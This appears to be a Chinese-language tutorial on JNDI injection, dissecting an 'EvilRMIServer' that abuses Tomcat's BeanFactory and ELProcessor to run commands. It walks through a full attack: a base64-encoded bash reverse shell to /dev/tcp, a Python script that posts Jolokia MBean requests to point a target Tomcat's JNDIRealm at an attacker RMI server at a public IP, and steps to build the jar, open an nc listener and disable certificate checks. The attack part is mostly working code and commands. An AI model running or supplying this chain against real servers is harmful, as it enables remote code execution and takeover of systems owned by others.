# JNDI 注入



## 1. 什么是JNDI

JNDI：JAVA naming and directory intrface

java命名和目录的接口



* 就是一个为了完成某些特定工作的，从而设计的一个接口



## 2. 产生注入的原因

JNDI产生注入的原因：

* lookup方法可以控制（那么就可以对他进行利用，从而实现攻击）



### 1. lookup 方法的作用

lookup：起到一个查询的作用



查询？查询什么?



查询命名绑定的java对象





## 3. 利用环境

fastjson反序列化



## 代码解析

### 环境

* java 1.8.0_211
* 源码：https://github.com/welk1n/JNDI-Injection-Bypass
* 参考文章：https://paper.seebug.org/851/#0x04-poc



### 1. EvilRMIServer



主函数

```java
    public static void main(String[] args) throws Exception{

        System.out.println("Creating evil RMI registry on port 2020");		
        Registry registry = LocateRegistry.createRegistry(2020);
        String ip = args[0];
        System.out.println(ip);
        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,6666));
        System.setProperty("java.rmi.server.hostname",ip);

        registry.bind("ExecByEL",evilRMIServer.execByEL());
        registry.bind("ExecByGroovy",evilRMIServer.execByGroovy());
    }
```

分析：

```java
Registry registry = LocateRegistry.createRegistry(2020);
```

* 创建并导出接受指定`port`请求的本地主机上的`Registry`实例。
* 就是说注册一个端口，即开放目标的端口，如：现在就是开启目标的2020端口



```java
String ip = args[0];
```

* args[0] 即接收传参的第一个数据.
* 所以我们需要指定程序入口，然后传入数据（IP）



```java
EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,6666));
```

* 创建了`EvilRMIServer` 对象
* 创建了`Listener`对象，并初始化赋值（ip,6666）

查看功能：

```java
public EvilRMIServer(Listener listener){
        commandGenerator = new CommandGenerator(listener);
    }
```

同样是创建了对象，查看调用

`CommanGenerator.java`

```java
 public CommandGenerator(Listener listener){
        shellListener = listener;				//赋值   将我们初始的数据赋值给 shellListener
        reverseShellCommand = String.format(
                DEFAULT_COMMAND_TEMPLATE,		//定义的常量：bash -i >& /dev/tcp/%s/%d 0>&1
                shellListener.getIp(),			//调用Listener.java 获取IP
                shellListener.getPort());		//调用Listener.java 获取端口
    }
```

* string.format ：用于字符串格式化
  * %s     字符串类型
  * %d     整数类型（十进制）

相当于建立了一个tcp连接

执行完结果是：

```txt
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1		//建立127.0.0.1:6666 tcp连接
```

* 即用来执行反弹shell



继续：`EvilRMIServer.java`

```java
System.setProperty("java.rmi.server.hostname",ip);
```

* `setProperty`：设置指定键对值的系统属性
  * 总的来说就是rmi服务器ip设置
  * 原理：rmi server会将`java.rmi.server.hostname`的值传递给客户端，客户端根据得到的值去查找服务。

* 即：此时的服务器目标是：IP,然后通过客户端去查找IP的的服务



#### ExecByEL

```java
registry.bind("ExecByEL",evilRMIServer.execByEL());   //// 将evilRMIServer.execByEL() 注册到registry , 然后与ExecByEL 绑定
```

* `bind`：绑定对此注册表中指定 `name` 的远程引用。
  * 此时就是：ExecByEL，然后是当前类中方法的调用



##### 分析：execByEL

```java
    public ReferenceWrapper execByEL() throws RemoteException, NamingException{

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                commandGenerator.getBase64CommandTpl()
        )));
        return new ReferenceWrapper(ref);
    }
```



```java
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
```

* `org.apache.naming.ResourceRef`   表示的是资源引用的地址

```txt
ResourceRef[
className=javax.el.ELProcessor,			 //javax.el.ELProcessor类, 调用eval方法进行el注入(表达式注入) 实现RCE.
factoryClassLocation=null,
factoryClassName=org.apache.naming.factory.BeanFactory, //org.apache.naming.factory.BeanFactory类 
{type=scope,content=},
{type=auth,content=},
{type=singleton,content=true}
]
```



```java
ref.add(new StringRefAddr("forceString", "x=eval"));
```

* 资源引用地址数据增加
* 创建对象，然后初始化数据
* `forceString`
  * 给属性强制指定一个setter方法
  * `x`的setter方法设置为 ELProcessor.eval() 方法。



```java
ref.add(new StringRefAddr("x", String.format(
                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                        ")",
                commandGenerator.getBase64CommandTpl()
        )));   //格式化，拼接，从而执行commandGenerator.getBase64CommandTpl() 的命令（这里我们设置的是反弹shell的命令，当然可以自行更改）
```

添加内容：（即，执行反弹shell）

```txt
{type=x,content="".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')")}]
```





`commandGenerator.getBase64CommandTpl()`看看
为什么要base64

```java
public String getBase64CommandTpl(){
return "bash -c {echo," + 
Base64.getEncoder().encodeToString(reverseShellCommand.getBytes()) + 
"}|{base64,-d}|{bash,-i}";}

// bash -c 执行命令
//使用 Base64 编码方案编码指定的字节数组，转换为字符串并返回该字符串。 
//将字符串 base64解码 bash -i 交互命令

```

指定的命令是：`reverseShellCommand`

为：

```java
bash -i >& /dev/tcp/127.0.0.1/6666 0>&1				// 即反弹shell
```







### 2. 小结1

总的来说就是:

1. 相当于开启了一个rmi服务器，然后地址就是 我们输入的IP ，以及指定的端口：ip:端口   



2. 然后又指定了一个监听端口，用于下面的反弹shell 所以我们需要监听该端口，来接收反弹回来的shell



然后目前我们是在我们自己的服务器上搭建好了，但是目标还不知道我们的rmi服务器的地址，以及使用的方法

所以我们需要向目标发送我们的服务器地址以及我们使用的方法（即，我们需要执行的exp）





### 3. exp

```python
mport requests as req
import sys
from pprint import pprint

url = sys.argv[1] + "/jolokia/" // url：即指定目标
pprint(url)
#创建JNDIRealm // JNDIRealm：访问保存在 LDAP 目录服务器中的验证信息。 简单的来说就是对tomcat进行配置
create_JNDIrealm = {
"mbean": "Tomcat:type=MBeanFactory",
"type": "EXEC",
"operation": "createJNDIRealm",
"arguments": ["Tomcat:type=Engine"]
}
#写入contextFactory
set_contextFactory = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "WRITE",
"attribute": "contextFactory",
"value": "com.sun.jndi.rmi.registry.RegistryContextFactory" //提供注册表的创建以及查找和命名远程对象的类、接口和异常 为了写入我们配置的rmi服务器以及
}
#写入connectionURL为自己公网RMI service地址
set_connectionURL = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "WRITE",
"attribute": "connectionURL",
"value": "rmi://118.31.228.80:2020/ExecByEL" //此时的地址为我们之前在java代码中设置的目标，以及端口，然后调用方法
}
#停止Realm
stop_JNDIrealm = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "EXEC",
"operation": "stop",
"arguments": []
}
#运行Realm，触发JNDI 注入
start = {
"mbean": "Tomcat:realmPath=/realm0,type=Realm",
"type": "EXEC",
"operation": "start",
"arguments": []
} //相当于保存配置，然后重新运行

expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]

for i in expoloit:
rep = req.post(url, json=i) // 使用post 发送数据
pprint(rep.json())
```



* 即通过post请求，向目标发送我们的rmi服务器，以及使用的方法
* 然后我们指定的方法：ExecByEL    是用于反弹shell的
* 当目标使用lookup来我们的服务器来查找的话，就触发反弹shell，从而实现攻击















## 操作流程

### 1. rmi服务配置

配置好服务端口，然后配置执行的命令（当然默认的也可以）

![](https://res.cloudinary.com/valent/image/upload/v1605875785/Blog/JavaWeb/JNDI/1_zj2m6a.png)




这里设置的服务端口为：2020

然后tcp连接端口设置的为：6666（之后监听该端口就行）



配置完成之后将项目打包

```cmd
mvn clean install
```


![](https://res.cloudinary.com/valent/image/upload/v1605875785/Blog/JavaWeb/JNDI/2_xkcnmz.png)


将打包完成的jar包上传到我们的服务器当中





### 2. jar运行

上传完成后运行

```bash
# java -cp JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer 服务器IP
```

* -cp 指定运行的目标 然后需要输入服务器的IP
* `payloads.EvilRMIServer`：指定执行的类
* 服务器IP：设置的rmi服务器的IP



那么此时：

* rmi服务器端的地址为：`服务器IP:2020`
* 然后tcp连接的地址为：`服务器I:6666`





### 3. 端口监听

服务器监听端口：6666

```bash
# nc -lvp 6666
```





### 4. exp运行

然后运行exp

```cmd
# python3 exp2.py http://xxxxx:xxxx
```



当提示目标证书错误时，解决办法：

修改exp代码

```python
rep = req.post(url, json=i,verify=False) // 使用post 发送数据
```

`verify=False`，就是用来关闭验证的！！

之后可以正常运行



### 5. 接收反弹shell



等待反弹shell即可

